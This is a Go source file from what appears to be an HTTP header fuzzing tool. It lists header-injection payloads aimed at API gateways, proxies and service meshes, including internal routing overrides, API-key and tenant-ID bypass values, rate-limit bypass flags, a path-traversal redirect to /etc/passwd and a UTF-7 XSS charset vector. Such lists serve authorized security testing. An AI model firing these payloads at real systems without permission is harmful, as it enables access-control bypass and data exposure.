package headers

import "github.com/cc1a2b/hhunter/engine"

func GetGatewayMutations() []engine.Mutation {
	mutations := []engine.Mutation{}

	// API Gateway routing manipulation
	routingHeaders := []struct {
		header string
		value  string
		impact string
	}{
		// Kong Gateway
		{"X-Kong-Upstream", "internal-service", "Kong upstream routing override"},
		{"X-Kong-Proxy-Latency", "0", "Kong latency injection"},
		{"X-Kong-Request-Id", "attacker-id", "Kong request ID override"},
		{"Kong-Debug", "1", "Kong debug mode activation"},

		// AWS API Gateway
		{"X-Amz-Api-Version", "2023-01-01", "AWS API version override"},
		{"X-Amz-Target", "AdminService.ListUsers", "AWS API target override"},
		{"X-Amz-Security-Token", "FwoGZXIvYXdzEBY", "AWS security token injection"},
		{"X-Api-Key", "internal-api-key", "API key injection"},
		{"X-Api-Key", "test", "API key — test/default value"},
		{"X-Api-Key", "admin", "API key — admin value"},
		{"X-Api-Key", "null", "API key — null bypass"},
		{"X-Api-Key", "", "API key — empty bypass"},

		// Azure API Management
		{"Ocp-Apim-Subscription-Key", "test-key", "Azure APIM subscription key injection"},
		{"Ocp-Apim-Trace", "true", "Azure APIM trace enable"},
		{"Ocp-Apim-Gateway-Id", "internal", "Azure APIM gateway ID override"},

		// Nginx / OpenResty
		{"X-Accel-Redirect", "/internal/admin", "Nginx internal redirect to admin"},
		{"X-Accel-Redirect", "/internal/config", "Nginx internal redirect to config"},
		{"X-Accel-Redirect", "/../../../etc/passwd", "Nginx internal redirect path traversal"},
		{"X-Accel-Buffering", "no", "Nginx disable response buffering"},
		{"X-Accel-Charset", "utf-7", "Nginx charset override — XSS vector"},
		{"X-Accel-Expires", "0", "Nginx cache expiry override"},
		{"X-Accel-Limit-Rate", "0", "Nginx rate limit disable"},

		// Traefik
		{"X-Traefik-Router", "admin@internal", "Traefik router override to internal"},
		{"X-Traefik-Service", "admin-service", "Traefik service override"},
		{"X-Traefik-Middleware", "bypass-auth", "Traefik middleware bypass"},

		// HAProxy
		{"X-Haproxy-Server-State", "UP", "HAProxy server state injection"},
		{"X-Proxy-Backend", "admin-backend", "Proxy backend routing override"},

		// Envoy Proxy
		{"X-Envoy-Original-Path", "/admin", "Envoy original path override"},
		{"X-Envoy-Original-Dst-Host", "internal-service:8080", "Envoy destination host override"},
		{"X-Envoy-Peer-Metadata", "admin=true", "Envoy peer metadata injection"},
		{"X-Envoy-Retry-On", "5xx", "Envoy retry policy injection"},
		{"X-Envoy-Max-Retries", "100", "Envoy max retries manipulation"},
		{"X-Envoy-Upstream-Rq-Timeout-Ms", "0", "Envoy disable timeout"},
		{"X-Envoy-Decorator-Operation", "admin.operation", "Envoy decorator override"},
		{"X-Envoy-Internal", "true", "Envoy mark request as internal"},

		// Istio Service Mesh
		{"X-Istio-Attributes", "source.uid=admin", "Istio attribute injection"},
		{"X-B3-Flags", "1", "Istio/Zipkin debug flag"},
		{"X-Request-Id", "admin-request", "Istio request ID override"},

		// Generic gateway headers
		{"X-Gateway-Version", "internal", "Gateway version override"},
		{"X-Gateway-Token", "admin-token", "Gateway token injection"},
		{"X-Upstream-Host", "internal-admin:8080", "Upstream host override"},
		{"X-Route-Prefix", "/admin", "Route prefix override"},
		{"X-Service-Name", "admin-service", "Service name override"},
		{"X-Backend-Host", "localhost:8080", "Backend host override to localhost"},
		{"X-Backend-URL", "http://localhost:8080/admin", "Backend URL override"},
		{"X-Proxy-URL", "http://internal-service/admin", "Proxy URL override"},

		// API versioning
		{"X-Api-Version", "internal", "API version — internal"},
		{"X-Api-Version", "v0", "API version — v0 (dev/debug)"},
		{"X-Api-Version", "v99", "API version — non-existent version"},
		{"Api-Version", "2099-01-01", "API version date — future"},

		// Tenant / multi-tenancy bypass
		{"X-Tenant-ID", "0", "Tenant ID zero — root/default tenant"},
		{"X-Tenant-ID", "1", "Tenant ID 1 — first/admin tenant"},
		{"X-Tenant-ID", "admin", "Tenant ID admin"},
		{"X-Tenant-ID", "*", "Tenant ID wildcard"},
		{"X-Tenant-ID", "../../admin", "Tenant ID traversal"},
		{"X-Organization-ID", "0", "Org ID zero"},
		{"X-Organization-ID", "1", "Org ID 1"},
		{"X-Workspace-ID", "default", "Workspace default"},
		{"X-Customer-ID", "0", "Customer ID zero"},
		{"X-Namespace", "admin", "Namespace admin"},
		{"X-Namespace", "kube-system", "Namespace kube-system"},
		{"X-Namespace", "default", "Namespace default"},

		// GraphQL gateway
		{"X-GraphQL-Operation", "IntrospectionQuery", "GraphQL introspection via header"},
		{"X-GraphQL-Depth-Limit", "999", "GraphQL depth limit bypass"},
		{"X-GraphQL-Complexity-Limit", "999999", "GraphQL complexity limit bypass"},
		{"X-GraphQL-Persisted-Query", "false", "GraphQL persisted query bypass"},

		// Rate limiting & quota bypass via gateway
		{"X-Plan", "enterprise", "API plan override to enterprise"},
		{"X-Plan", "unlimited", "API plan override to unlimited"},
		{"X-Quota-Remaining", "999999", "Quota remaining override"},
		{"X-RateLimit-Bypass", "true", "Rate limit bypass flag"},
		{"X-Skip-Rate-Limit", "true", "Skip rate limit flag"},

		// Feature flags via gateway
		{"X-Feature-Flag", "admin-panel", "Feature flag — admin panel"},
		{"X-Feature-Flag", "internal-api", "Feature flag — internal API"},
		{"X-Feature-Flag", "debug-mode", "Feature flag — debug mode"},
		{"X-Canary", "true", "Canary deployment flag"},
		{"X-Canary-Weight", "100", "Force canary deployment routing"},
		{"X-AB-Test", "admin-variant", "A/B test variant override"},
	}

	for _, rh := range routingHeaders {
		mutations = append(mutations, engine.Mutation{
			Header:   rh.header,
			Value:    rh.value,
			Category: "Gateway",
			Impact:   "API gateway/routing bypass: " + rh.impact,
		})
	}

	// Server-Timing / diagnostics injection
	diagnosticHeaders := []struct {
		header string
		value  string
		impact string
	}{
		{"Server-Timing", "miss", "Server-Timing cache miss injection"},
		{"Server-Timing", `db;dur=0.1, cache;desc="miss"`, "Server-Timing diagnostic injection"},
		{"X-Timer", "S0,VS0,VE0", "Timer header injection (Fastly-style)"},
		{"X-Served-By", "attacker-node", "Served-by header injection"},
		{"X-Cache", "HIT", "Cache status injection"},
		{"X-Cache-Status", "HIT", "Cache status injection variant"},
		{"X-Cache-Key", "/admin", "Cache key injection"},
		{"Surrogate-Capability", `"attacker"="ESI/1.0"`, "ESI capability injection"},
		{"Surrogate-Control", "max-age=3600", "Surrogate cache control injection"},
	}

	for _, dh := range diagnosticHeaders {
		mutations = append(mutations, engine.Mutation{
			Header:   dh.header,
			Value:    dh.value,
			Category: "Gateway",
			Impact:   "Gateway diagnostic injection: " + dh.impact,
		})
	}

	return mutations
}
